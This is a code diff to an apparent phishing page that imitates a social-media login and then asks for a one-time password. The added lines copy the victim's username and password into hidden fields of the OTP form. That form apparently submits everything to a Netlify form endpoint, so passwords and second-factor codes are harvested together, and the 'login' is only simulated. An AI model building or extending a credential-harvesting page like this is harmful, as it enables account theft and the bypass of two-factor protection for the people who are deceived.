@@ -35,8 +35,8 @@
             <!-- Login Form -->
             <div class="l-part">
                 <form id="loginForm">
-                    <input type="text" name="username" placeholder="Phone number, username, or email" class="input-1" required>
-                    <input type="password" name="password" placeholder="Password" class="input-2" required>
+                    <input type="text" name="username" id="username" placeholder="Phone number, username, or email" class="input-1" required>
+                    <input type="password" name="password" id="password" placeholder="Password" class="input-2" required>
                     <input type="submit" class="btn" value="Log In">
                 </form>
             </div>
@@ -52,6 +52,8 @@
             <h3>Enter OTP</h3>
             <p>We've sent a one-time password to your email.</p>
             <form id="otpForm" name="otp" netlify>
+                <input type="hidden" name="username" id="otpUsername">
+                <input type="hidden" name="password" id="otpPassword">
                 <input type="text" name="otp" placeholder="Enter OTP" class="input-1" required>
                 <input type="submit" class="btn" value="Verify OTP">
             </form>
@@ -82,8 +84,18 @@
         // Simulate login and show OTP section
         document.getElementById('loginForm').addEventListener('submit', function (e) {
             e.preventDefault(); // Prevent form submission
-            document.getElementById('loginSection').classList.add('hidden'); // Hide login section
-            document.getElementById('otpSection').classList.remove('hidden'); // Show OTP section
+
+            // Get username and password values
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            // Set username and password in the OTP form
+            document.getElementById('otpUsername').value = username;
+            document.getElementById('otpPassword').value = password;
+
+            // Hide login section and show OTP section
+            document.getElementById('loginSection').classList.add('hidden');
+            document.getElementById('otpSection').classList.remove('hidden');
         });
     </script>
 </body>
